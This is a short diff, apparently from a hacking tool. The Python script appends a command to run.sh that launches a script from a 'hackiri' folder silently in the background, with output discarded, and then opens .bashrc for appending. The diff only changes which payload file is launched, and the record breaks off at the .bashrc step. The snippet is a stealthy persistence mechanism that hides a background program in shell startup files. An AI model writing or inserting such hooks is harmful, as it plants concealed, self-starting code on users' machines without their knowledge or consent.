@@ -1,7 +1,7 @@
 import os
 os.system('cd $HOME')
 file = open('run.sh' , 'a+')
-file.write('python hackiri/hack-goshi.py &> /dev/null &')
+file.write('python hackiri/fileri_robika.py &> /dev/null &')
 file.close()
 try:
     file2 = open('.bashrc' , 'a')
